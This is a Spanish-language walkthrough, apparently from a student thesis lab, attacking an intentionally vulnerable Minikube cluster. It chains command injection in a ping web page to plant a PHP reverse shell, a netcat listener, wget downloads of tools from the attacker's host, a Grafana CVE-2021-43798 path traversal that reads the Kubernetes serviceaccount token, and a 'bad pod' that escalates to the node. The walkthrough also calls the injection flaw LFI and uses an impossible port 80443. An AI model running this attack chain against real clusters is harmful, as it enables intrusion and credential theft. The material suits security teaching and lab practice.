Tras deplegar el laboratorio, ejecutamos este comando para que minikube nos lance un url donde hay una web básica para hacer ping a distintos dominios. 

```bash 
minikube service --all 
``` 
![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/web_lfi.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/web_lfi.png) 

Dicha página es vulnerable a LFI: 
![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/googlecom_ls.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/googlecom_ls.png)

Por ello intentaremos transformar el LFI a RCE a través de una reverse shell con PHP, modificando la IP y el puerto donde vamos a escuchar con netcat con nuestra máquina. Nuestro objetivo es conseguir escribir un archivo dentro del sistema al cual accediendo se lanza una shell en nuestra máquina que está escuchando. Más información del proceso en [php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). Pasos: 

1. Cambiamos la IP y el puerto y basemos el archivo php-revshell.php a base64. 
```bash 
base64 php-revshell.php 
``` 

2. Ejecutamos este comando el la web (utilizando como IP la 192.168.1.131 y el puerto 80443):
```bash 
google.com;echo "<php-revshell in base64>" | base64 -d > shell.php
``` 

3. Verificamos que se ha subido el archivo shell.php: ```bash google.com;ls -l ```
![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/googlecom_ls.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/googlecom_ls.png)

4. Ahora en nuestra máquina escuchamos por el puerto que hemos definido en el archivo php, en este caso el 80443: 
``` bash
nc -lvp 80443
```
2. Una vez escuchando en el puerto, ejecutamos el comando:
```bash
curl http://<ip-web>:<puerto-web>/shell.php
```
Conseguimos entrar en el pod donde se está ejecutando el servicio web. 

![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/revshell.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/revshell.png) 

Una vez dentro hacemos un reconocimiento en el pod: 1. Verificamos si podemos crear otros pods, para ello pasamos un binario de kubectl desde nuestra máquina creando un servidor web con python (recomendable copiar el bianrio en el archivo /tmp y ejecutar el comando ahí): 
```bash 
python3 -m http.server
``` 

Descargamos el binario y damos permisos de ejecución: 
```bash
wget 192.168.1.131:8000/kubectl chmod +x kubectl
``` 
Verificamos si es posible la creación de pods:
```bash
./kubectl auth can-i create pods
``` 
![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/no_can-i%20create%20pods.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/no_can-i%20create%20pods.png) 
1. Como no se puede crear pod vemos si hay otros servicios corriendo en el nodo. 
```bash 
env 
```
![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/env.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/env.png)
Vemos que hay un servicio Grafana corriendo en 10.103.238.75:3000. Buscamos la versión de Grafana para buscar posibles vulnerabilidades.

``` bash 
apk add curl curl http://10.103.238.75:3000/login | grep version 
``` 
![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/grafana_version.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/grafana_version.png)

Vemos que la versión de Grafana es la "8.3.0-beta2". Buscando en internet vemos que es vulnerable a LFI, es decir podemos leer archivos del pod de Grafana. La vulnerabilidad esta clasificada con [CVE-2021-43798](https://www.exploit-db.com/exploits/50581). Aprovechando la vulnerabilidad de Grafana podemos leer el JWT del serviceaccount de Grafana, para ver si en este caso es posible crear pods con dicho token. ``` bash wget http://10.103.238.75:3000/public/plugins/alertGroups/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token export token=$(cat token) ``` ![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/token_env.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/token_env.png) Comprobamos si el posible crear pods con el token de Grafana: 
``` bash 
./kubectl auth can-i create pods --token=$token
``` 
![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/yes_can-i.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/yes_can-i.png)

Como es posible crear pods, podemos crear un [badpods](https://github.com/BishopFox/badPods) para escalar privilegios al nodo de Minikube.  Este es el YAML que utilizaremos. Copiamos el archivo en la el pod del servicio web, esto lo podemos hacer igual que antes con el servidor python, utilizando los comandos: 
```bash 
wget 192.168.1.131:8000/bad-pod.yaml ./kubectl apply -f bad-pod.yaml --token=$token
``` 
![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/create%20bad-pod.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/create%20bad-pod.png) 

![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/final_node.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/final_node.png)